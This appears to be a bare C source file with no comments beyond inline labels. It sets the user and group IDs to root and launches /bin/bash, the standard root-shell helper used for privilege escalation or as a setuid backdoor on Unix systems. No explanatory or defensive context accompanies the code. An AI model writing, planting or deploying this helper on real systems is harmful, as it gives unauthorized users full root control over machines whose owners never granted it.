#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);   // set user ID to root
    setgid(0);   // set group ID to root
    system("/bin/bash"); // spawn a shell
    return 0;
}